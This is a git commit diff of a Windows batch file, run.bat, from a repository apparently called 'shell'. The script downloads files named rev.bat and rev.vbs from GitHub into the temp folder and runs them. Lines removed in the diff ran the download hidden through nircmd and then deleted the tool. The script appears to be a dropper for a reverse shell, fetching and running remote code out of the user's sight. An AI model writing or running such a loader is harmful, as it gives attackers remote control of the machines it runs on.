24094e78087a3c33f97889d993421ad76fa675d4
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-03 05:25:26 +0300

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,9 +1,6 @@
 @echo off
 set "temp_dir=%temp%"
-if not exist "%temp_dir%\nircmd.exe" (
-    curl https://raw.githubusercontent.com/0x2034/shell/main/nircmd.exe -o "%temp_dir%\nircmd.exe"
-)
 curl https://raw.githubusercontent.com/0x2034/shell/main/rev.bat -o "%temp_dir%\rev.bat"
-start /min cmd /c "%temp_dir%\nircmd.exe" exec hide cmd /c "%temp_dir%\rev.bat"
-ping 127.0.0.1 -n 5 > nul
-del "%temp_dir%\nircmd.exe"
+curl https://raw.githubusercontent.com/0x2034/shell/main/rev.vbs -o "%temp_dir%\rev.vbs"
+call rev.vbs
+exit
